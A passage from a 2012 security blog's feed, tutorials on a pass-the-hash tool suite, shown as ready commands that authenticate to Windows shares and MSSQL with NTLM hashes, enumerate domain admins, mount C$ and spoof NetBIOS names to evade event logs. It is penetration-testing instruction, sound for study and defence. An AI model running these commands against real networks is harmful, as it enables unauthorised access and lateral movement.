/&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;So, moving forward I plan on several blog entries. &amp;nbsp;I think the first one is going to be an in-depth refresher on PTH. &amp;nbsp;I&#39;m also going to have to do a post on Windows authentication mechanisms and talk about the stuff the whitepaper glossed over... I&#39;m also going to do a post on hash collection methods... and also on the &quot;mitigation&quot; techniques and what MS was shooting for and what the actual effects would be if implemented...&lt;br /&gt;&lt;br /&gt;and all I wanted for XMAS was a&amp;nbsp;vacation.... :/&lt;br /&gt;&lt;ul&gt; &lt;/ul&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/6594184210909818182/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/12/and-were-back.html#comment-form' title='1 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/6594184210909818182'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/6594184210909818182'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/12/and-were-back.html' title='And we&#39;re back...'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>1</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-3413572097661450272</id><published>2012-09-09T17:11:00.002-07:00</published><updated>2013-05-16T13:59:16.416-07:00</updated><title type='text'>Samba Part 2 - The Net Command</title><content type='html'>Sorry for the delay, but I was on assessment for a month straight and out of the country.&lt;br /&gt;&lt;br /&gt;Samba&#39;s &#39;net&#39; command is similar to its Windows counterpart, yet incorporates additional functionality from other Windows commands, such as &#39;sc&#39;.&lt;br /&gt;&lt;br /&gt;The &#39;net&#39; command uses the &#39;-U&#39; , the &#39;W&#39; and the &#39;-n&#39; command line options from my previous post on Samba.&amp;nbsp; The server we&#39;re querying is &#39;-S &amp;lt;server ip/name&amp;gt;&#39;&lt;br /&gt;&lt;br /&gt;The &#39;net&#39; command has a large amount of built in documentation.&amp;nbsp; I&#39;ll summarize some of the more useful features here.&amp;nbsp; We will be releasing our &quot;PTH Rosetta Stone&quot; hopefully in the next few weeks that will detail how to accomplish various tasks using both the native Windows command line utilities and the associated Samba utilities.&lt;br /&gt;&lt;br /&gt;The basic format is:&lt;br /&gt;net [rap|rpc|ads] &amp;lt;command&amp;gt; [options]&lt;br /&gt;&lt;br /&gt;&quot;net rap&quot; commands&amp;nbsp;are primarily used for old SMB servers&amp;nbsp;(think IBM / OS2).&lt;br /&gt;&lt;br /&gt;&quot;net ads&quot; commands are used for&amp;nbsp;Active Directory&amp;nbsp;integration, meaning the linux box has been added to an&amp;nbsp;AD environment.&amp;nbsp; Suffice it to say that this is rarely the case for&amp;nbsp;pen tests ;-) (that and I can&#39;t remember if I had&amp;nbsp;all the bits and pieces compiled in for that to work...)&lt;br /&gt;&lt;br /&gt;&quot;net rpc&quot; is the series of commands we will primarily deal with.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;So, a typical example of the net command to view a list of all users in a domain &quot;demo&quot; would be:&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;net rpc user -S&amp;nbsp;172.16.1.1 -U demo/user%pw&amp;nbsp;-n dummy1 -W demo&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color: white;&quot;&gt;To list all groups in the domain, use the following command:&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;net rpc group -S 172.16.1.1 -U demo/user%pw -n dummy1 -W demo&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color: white;&quot;&gt;List all the members of the &quot;domain admins&quot; group :&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;net rpc group members &quot;domain admins&quot; -S 172.16.1.1 -U demo/user%pw -n dummy1 -W demo&amp;nbsp;&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color: white;&quot;&gt;Here&#39;s a complete list of commands available.&amp;nbsp; Note that some of the net commands only apply if the Linux box is joined to a domain.&amp;nbsp; Usually to get more info on the subcommand just tack a &quot;help&quot; on the end to get a listing of subcommands.&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://4.bp.blogspot.com/--ROMPQqYvYs/UE0vqXYiahI/AAAAAAAAACg/V6s4xCY_Fyg/s1600/new+blog+net.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;640&quot; src=&quot;http://4.bp.blogspot.com/--ROMPQqYvYs/UE0vqXYiahI/AAAAAAAAACg/V6s4xCY_Fyg/s640/new+blog+net.png&quot; width=&quot;362&quot; /&gt;&lt;/a&gt;&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/3413572097661450272/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/09/samba-part-2-net-command.html#comment-form' title='2 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/3413572097661450272'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/3413572097661450272'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/09/samba-part-2-net-command.html' title='Samba Part 2 - The Net Command'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://4.bp.blogspot.com/--ROMPQqYvYs/UE0vqXYiahI/AAAAAAAAACg/V6s4xCY_Fyg/s72-c/new+blog+net.png" height="72" width="72"/><thr:total>2</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-4210911709154498232</id><published>2012-08-14T13:28:00.001-07:00</published><updated>2012-08-14T13:28:02.639-07:00</updated><title type='text'>Breaking News! PTH Suite Now in Backtrack!!</title><content type='html'>Thanks to the tireless efforts of @purehate_, the PTH suite is now available in the Backtrack repositories.&amp;nbsp; I had a minor issue installing, so I&#39;ll walk through the steps I went through to debug the issue.&amp;nbsp; YMMV.&lt;br /&gt;&lt;br /&gt;To install:&lt;br /&gt;&lt;br /&gt;1) run &quot;&lt;span style=&quot;color: lime;&quot;&gt;apt-get update&lt;/span&gt;&quot; to update the package list on your local computer.&lt;br /&gt;2) run &quot;&lt;span style=&quot;color: lime;&quot;&gt;apt-cache search pth-suite&lt;/span&gt;&quot;.&amp;nbsp;&amp;nbsp; If you see something similar to :&lt;br /&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-G2aC0jeJadg/UCqw2bL2LQI/AAAAAAAAACI/gHtWCBpS1H0/s1600/apt-cache-search.png&quot; imageanchor=&quot;1&quot; style=&quot;clear: left; float: left; height: 33px; margin-bottom: 1em; margin-right: 1em; width: 400px;&quot;&gt;&lt;/a&gt;&lt;br /&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-G2aC0jeJadg/UCqw2bL2LQI/AAAAAAAAACI/gHtWCBpS1H0/s1600/apt-cache-search.png&quot; imageanchor=&quot;1&quot; style=&quot;clear: left; float: left; height: 33px; margin-bottom: 1em; margin-right: 1em; width: 400px;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;30&quot; src=&quot;http://1.bp.blogspot.com/-G2aC0jeJadg/UCqw2bL2LQI/AAAAAAAAACI/gHtWCBpS1H0/s400/apt-cache-search.png&quot; width=&quot;400&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp; then all you need to do is &quot;&lt;span style=&quot;color: lime;&quot;&gt;apt-get install pth-suite&lt;/span&gt;&quot; and it will install.&lt;br /&gt;&lt;br /&gt;3) If you do &lt;u&gt;NOT&lt;/u&gt; see the listing for it, then you will probably need to add the testing repository as a&amp;nbsp; source for apt.&amp;nbsp; Edit your /etc/apt/sources.list to look like this:&lt;img border=&quot;0&quot; height=&quot;60&quot; src=&quot;http://1.bp.blogspot.com/-W73O9ZoimbA/UCqw3zkeilI/AAAAAAAAACQ/yt2St4p7dvU/s400/apt-list.png&quot; width=&quot;400&quot; /&gt;&lt;br /&gt;&lt;br /&gt;On my backtrack dev machine, the line beginning with &quot;deb http://source&quot; was commented out.&amp;nbsp; In that case simply uncomment out the line, save the file,&amp;nbsp;and rerun steps 1 and 2.&amp;nbsp; If you have additional problems, lemme know and I&#39;ll see how I can help out.&lt;br /&gt;&lt;br /&gt;To Utilize the New Tools:&lt;br /&gt;&lt;br /&gt;The executables are located in&lt;em&gt;&lt;strong&gt; /pentest/passwords/pth/bin&lt;/strong&gt;&lt;/em&gt;.&amp;nbsp; If you want to use then automagically, then consider modifying your PATH to put this path first.&amp;nbsp; Consider appending the following line to /root/.bashrc if you find yourself using these utilities consistently.&amp;nbsp; IE:&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;# export PATH=/pentest/passwords/pth/bin:$PATH&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;strong&gt;Keep in mind that there could be Samba executables in your normal path. &amp;nbsp;Use the &#39;which&#39; command to see what path is being used for a particular binary.&lt;/strong&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/4210911709154498232/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/08/breaking-news-pth-suite-now-in-backtrack.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/4210911709154498232'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/4210911709154498232'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/08/breaking-news-pth-suite-now-in-backtrack.html' title='Breaking News! PTH Suite Now in Backtrack!!'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://1.bp.blogspot.com/-G2aC0jeJadg/UCqw2bL2LQI/AAAAAAAAACI/gHtWCBpS1H0/s72-c/apt-cache-search.png" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-4291980219725420995</id><published>2012-08-12T20:21:00.000-07:00</published><updated>2012-08-12T20:21:22.527-07:00</updated><title type='text'>Samba Stuff PT 1 - basics / smbclient</title><content type='html'>Several of the tools I demonstrated the pass-the-hash technique with are either part of Samba or use its libraries to access Windows DCE/RPC functionality and build from there.&lt;br /&gt;&lt;br /&gt;Many of the Samba tools use many of the same command line arguments, which I will cover a couple of the commonly used ones briefly.&amp;nbsp; After that, I&#39;ll introduce you to smbclient, one of the staples of the Samba suite of utilities.&lt;br /&gt;&lt;br /&gt;Common useful options:&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;-U domain/user%password&lt;/span&gt; &lt;br /&gt;&lt;br /&gt;IE &lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;-U demo/alice000000000000000000000000000000:12345678912345678912345678912345&lt;/span&gt;&lt;br /&gt;or&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;-U demo/alice000000000000000000000000000000:12345678912345678912345678912345:::&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;(Capital) U then the target user&#39;s domain followed by a &#39;/&#39; followed by &#39;%&#39; and the password or hash.&lt;br /&gt;I like specifying everything for the user I&#39;m impersonating in one complete blob.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;---------- &lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;-n &amp;lt;netbios name to use&amp;gt;&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;IE&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;-n exch01&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;(Lowercase n) By default Samba will use the computer&#39;s host name as its client-side netbios name when issuing requests.  In the case of Backtrack, this will probably be &quot;BT5&quot;.  Use of this option can make it more stealthy on the network and in the event logs.  &lt;br /&gt;&lt;br /&gt;---------- &lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;-W &amp;lt;workgroup / domain name&amp;gt;&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;IE&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;-W demo&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;(Capital W) Specify the domain to use in the client side request.&amp;nbsp; Usually set to &quot;workgroup&quot; if not otherwise specified in the smb.conf or on the command line.&amp;nbsp; Another option to set to be more stealthy on the wire.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;---------- &lt;br /&gt;&lt;br /&gt;Smbclient is a client that allows you to mount a windows file share and maneuver around in a very similar manner to the venerable &#39;ftp&#39; client.&amp;nbsp; It also allows you to list shares available on a remote server.&lt;br /&gt;&lt;br /&gt;To list the shares on a remote machine:&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;smbclient -L &amp;lt;IP&amp;gt;&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;a href=&quot;http://3.bp.blogspot.com/-CXohKzr21pI/UChrd4EQuTI/AAAAAAAAABw/9EZ4kNVNT_s/s1600/smbclient.png&quot; imageanchor=&quot;1&quot; style=&quot;clear: left; float: left; margin-bottom: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;31&quot; src=&quot;http://3.bp.blogspot.com/-CXohKzr21pI/UChrd4EQuTI/AAAAAAAAABw/9EZ4kNVNT_s/s400/smbclient.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;to mount&amp;nbsp; a share , specify the machine and share&amp;nbsp;:&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color: lime;&quot;&gt;smbclient -U &amp;lt;user info&amp;gt; //&amp;lt;machine&amp;gt;/&amp;lt;share&amp;gt;&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://3.bp.blogspot.com/-CXohKzr21pI/UChrd4EQuTI/AAAAAAAAABw/9EZ4kNVNT_s/s1600/smbclient.png&quot; imageanchor=&quot;1&quot; style=&quot;clear: left; float: left; margin-bottom: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;32&quot; src=&quot;http://3.bp.blogspot.com/-CXohKzr21pI/UChrd4EQuTI/AAAAAAAAABw/9EZ4kNVNT_s/s400/smbclient.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;so, to bring it all together :&lt;br /&gt;&lt;br /&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-ZDjrD3lidGc/UChtOkmU2wI/AAAAAAAAAB4/x6imuE0zTaY/s1600/smbclient+all.png&quot; imageanchor=&quot;1&quot; style=&quot;clear: left; float: left; margin-bottom: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;117&quot; src=&quot;http://1.bp.blogspot.com/-ZDjrD3lidGc/UChtOkmU2wI/AAAAAAAAAB4/x6imuE0zTaY/s400/smbclient+all.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;We attach to the C$ share on 172.16.1.1 as the admin user.&amp;nbsp; We also specify that our domain is &quot;demo&quot; and that our name is &quot;2k864-svr&quot;, which happens to be the exchange server. :-)</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/4291980219725420995/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/08/samba-stuff-pt-1-basics-smbclient.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/4291980219725420995'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/4291980219725420995'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/08/samba-stuff-pt-1-basics-smbclient.html' title='Samba Stuff PT 1 - basics / smbclient'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://3.bp.blogspot.com/-CXohKzr21pI/UChrd4EQuTI/AAAAAAAAABw/9EZ4kNVNT_s/s72-c/smbclient.png" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-683481197055855484</id><published>2012-08-03T19:40:00.004-07:00</published><updated>2012-08-04T11:37:39.242-07:00</updated><title type='text'>PTH with MSSQL and FreeTDS/SQSH</title><content type='html'>FreeTDS (TDS == Tabular Data Stream and is the protocol used by MSSQL and Sybase)&amp;nbsp;and SQSH provide a method for connecting to Microsoft SQL servers under Linux.&amp;nbsp; Since FreeTDS is a protocol implememntation library, sqsh (SQL Shell) is used to actually interact with the MS SQL servers.&amp;nbsp; Assuming that the MS SQL servers are configured to allow Windows Integrated Authentication, we can pass the hash to login and interact with them.&lt;br /&gt;&lt;br /&gt;The first step is to configure the .conf file to use with FreeTDS. &lt;br /&gt;&lt;br /&gt;A sample snippet follows:&lt;br /&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color: lime;&quot;&gt;# A typical Microsoft server&lt;br /&gt;[mssql]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; host = 10.2.2.19&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; port = 1433&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; tds version = 7.0&lt;/span&gt;&lt;/strong&gt;&lt;/blockquote&gt;&lt;br /&gt;In this example, &quot;mssql&quot; is the name of the server we will pass to sqsh.&lt;br /&gt;The hostname / IP is 10.2.2.19 and the port is 1433.&lt;br /&gt;The TDS version is 7.0 and will work on SQL servers from SQL 2000 until the latest.&lt;br /&gt;&lt;br /&gt;Typically the file will be stored in /etc, or in our case /opt/pth/etc/freetds.conf.&amp;nbsp; A good habit to get into is to specify the location of the file using the FREETDSCONF environmental variable, to prevent having to chase down which file is being referenced as FreeTDS could be installed in a couple of different places.&lt;br /&gt;&lt;br /&gt;For our example, we&#39;ll add the text above into /root/freetds.conf and set the FREETDSCONF variable to point to it:&lt;br /&gt;&lt;br /&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color: lime;&quot;&gt;# export FREETDSCONF=/root/freetds.conf&lt;/span&gt;&lt;/strong&gt;&lt;/blockquote&gt;&amp;nbsp;Now, we use sqsh to interact with the database.&lt;br /&gt;&lt;br /&gt;The command line for sqsh looks like:&lt;br /&gt;&lt;br /&gt;&lt;strong&gt;&lt;span style=&quot;color: lime;&quot;&gt;sqsh -S&amp;lt;config file name&amp;gt;&amp;nbsp;-D&amp;nbsp;&amp;lt;database name&amp;gt;&amp;nbsp;-U &amp;lt;domain&amp;gt;\\&amp;lt;user&amp;gt; -P &amp;lt;password / hash&amp;gt;&lt;/span&gt;&lt;/strong&gt;&lt;br /&gt;so, as an example:&lt;br /&gt;&lt;br /&gt;&lt;strong&gt;&lt;span style=&quot;color: lime;&quot;&gt;sqsh -S mssql -D master -U demo\\mssql -P 00000000000000000000000000000000:DDF5EB5351C272CB8CC4EAE015F14E3A&lt;/span&gt;&lt;/strong&gt;&lt;br /&gt;&lt;br /&gt;Where the profile name is &quot;mssql&quot;, the domain is &quot;demo&quot;, the username is &quot;mssql&quot; and we want to connect to the &quot;master&quot; database, with the hash &quot;&lt;strong&gt;&lt;span style=&quot;color: lime;&quot;&gt;00000000000000000000000000000000:DDF5EB5351C272CB8CC4EAE015F14E3A&lt;/span&gt;&lt;/strong&gt;&quot;.&amp;nbsp; &lt;br /&gt;&lt;br /&gt;As with all the modified tools, the hash can also be specified as &quot;&lt;strong&gt;&lt;span style=&quot;color: lime;&quot;&gt;00000000000000000000000000000000:DDF5EB5351C272CB8CC4EAE015F14E3A&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;color: lime;&quot;&gt;:::&lt;/span&gt;&quot;.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;Assuming everything worked properly, you will end up with a prompt.&amp;nbsp; To issue queries, type in the query and put &quot;go&quot; on a separate line.&amp;nbsp; &lt;br /&gt;&lt;br /&gt;From here, the database is your oyster.... &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://3.bp.blogspot.com/-sIasJjgVrRI/UByKOxi6KnI/AAAAAAAAABQ/JleXxu0E3f0/s1600/sqsh-successful.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;230&quot; src=&quot;http://3.bp.blogspot.com/-sIasJjgVrRI/UByKOxi6KnI/AAAAAAAAABQ/JleXxu0E3f0/s400/sqsh-successful.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;If you see the following screen when you log in, verify the IP addresses in the configuration and validate that the credentials you are using are correct.&amp;nbsp; You might also want to verify that the account is enabled / isn&#39;t locked out, etc...&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://3.bp.blogspot.com/-XG2RdP-zDcs/UByKd97mLvI/AAAAAAAAABY/NXpTk6TfKJg/s1600/sqsh-failed.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;143&quot; src=&quot;http://3.bp.blogspot.com/-XG2RdP-zDcs/UByKd97mLvI/AAAAAAAAABY/NXpTk6TfKJg/s400/sqsh-failed.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;More information on SQSH can be found here:&amp;nbsp; &lt;br /&gt;&lt;a href=&quot;http://www.sqsh.org/&quot;&gt;http://www.sqsh.org/&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/683481197055855484/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/08/pth-with-mssql-and-freetdssqsh.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/683481197055855484'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/683481197055855484'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/08/pth-with-mssql-and-freetdssqsh.html' title='PTH with MSSQL and FreeTDS/SQSH'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://3.bp.blogspot.com/-sIasJjgVrRI/UByKOxi6KnI/AAAAAAAAABQ/JleXxu0E3f0/s72-c/sqsh-successful.png" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-899832645832770413</id><published>2012-08-01T19:36:00.002-07:00</published><updated>2013-03-07T19:07:34.065-08:00</updated><title type='text'>Demo Vids Online</title><content type='html'>Our demo videos are upload with added voiceovers.&amp;nbsp; &lt;br /&gt;&lt;br /&gt;Windows Video:&lt;br /&gt;&lt;a href=&quot;http://youtu.be/nElrc04LBGc&quot;&gt;http://youtu.be/nElrc04LBGc&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;Linux Video:&lt;br /&gt;http://www.youtube.com/watch?v=XUn8u9iMDtY&lt;br /&gt;&lt;br /&gt;Slides:&lt;br /&gt;&lt;a href=&quot;http://code.google.com/p/passing-the-hash/downloads/detail?name=BH%202012%20duckwall-campbell%20slides.pdf&amp;amp;can=2&amp;amp;q&quot;&gt;http://code.google.com/p/passing-the-hash/downloads/detail?name=BH%202012%20duckwall-campbell%20slides.pdf&amp;amp;can=2&amp;amp;q&lt;/a&gt;=&lt;br /&gt;&lt;br /&gt;In addition, we&#39;ll release some more documentation of the tools soon.&lt;br /&gt;&lt;br /&gt;Enjoy and share!&lt;br /&gt;&lt;br /&gt;Questions or comments?  Please ask!</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/899832645832770413/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/08/demo-vids-online.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/899832645832770413'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/899832645832770413'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/08/demo-vids-online.html' title='Demo Vids Online'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-7611725674845511683</id><published>2012-07-29T00:25:00.000-07:00</published><updated>2012-07-29T00:25:37.404-07:00</updated><title type='text'>Using PTH Firefox</title><content type='html'>Firefox is probably the easiest tool to use hashes with.&amp;nbsp; Use either the linux version or there is also a windows version available on the google code page &lt;a href=&quot;http://code.google.com/p/passing-the-hash/downloads/list&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;1)&amp;nbsp; Start the pth firefox.&amp;nbsp; Note that the name of the browser will show up as &quot;Nightly&quot; because FF is unbranded at this point.&amp;nbsp; This was done deliberately to differentiate it from the built in Firefox package.&lt;br /&gt;&lt;br /&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&lt;strong&gt;# /opt/pth/bin/firefox&lt;/strong&gt;&lt;/blockquote&gt;2)&amp;nbsp; Enter&amp;nbsp;&quot;about:config&quot; in the url window and accept the warning.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://4.bp.blogspot.com/-hylpTZ7t4Ms/UBTdxAgbfSI/AAAAAAAAAAQ/oBfdz5tzku8/s1600/ff-pth1.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;210&quot; src=&quot;http://4.bp.blogspot.com/-hylpTZ7t4Ms/UBTdxAgbfSI/AAAAAAAAAAQ/oBfdz5tzku8/s400/ff-pth1.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;3)&amp;nbsp; Type &quot;ntlm&quot; in the filter window&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://3.bp.blogspot.com/-9luhy669AZU/UBTd622q3CI/AAAAAAAAAAY/zBSwq0jJ9UM/s1600/ff-pth2.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img 